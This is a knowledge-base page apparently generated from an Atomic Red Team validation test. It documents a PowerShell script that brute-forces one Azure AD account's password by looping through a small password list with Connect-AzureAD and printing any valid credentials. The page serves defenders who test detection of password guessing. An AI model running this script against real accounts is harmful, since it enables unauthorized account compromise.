---
atomic_guid: "5a51ef57-299e-4d62-8e11-2d440df55e69"
title: "Brute Force Credentials of single Azure AD user"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.001"
attack_technique_name: "Brute Force: Password Guessing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "5a51ef57-299e-4d62-8e11-2d440df55e69"
  - "Brute Force Credentials of single Azure AD user"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Brute Force Credentials of single Azure AD user

Attempt to brute force Azure AD user via AzureAD powershell module.

## Metadata

- Atomic GUID: 5a51ef57-299e-4d62-8e11-2d440df55e69
- Technique: T1110.001: Brute Force: Password Guessing
- Platforms: azure-ad
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.001/T1110.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.001]]

## Input Arguments

### passwords

- description: List of passwords we will attempt to brute force with
- type: string
- default: Password1`n1q2w3e4r`nPassword!

### username

- description: Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
- type: string
- default: bruce.wayne@contoso.com

## Dependencies

AzureAD module must be installed.

### Prerequisite Check

```text
try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```text
Install-Module -Name AzureAD -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Import-Module -Name AzureAD

$passwords = "#{passwords}".split("{`n}")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
  try {
    Write-Host " [-] Attempting ${password} on account #{username}."
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] #{username}:${password} are valid credentials!`r`n"
    break
  } catch {
    Write-Host " [-] #{username}:${password} invalid credentials.`r`n"
  }
}
Write-Host "End of bruteforce"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml)
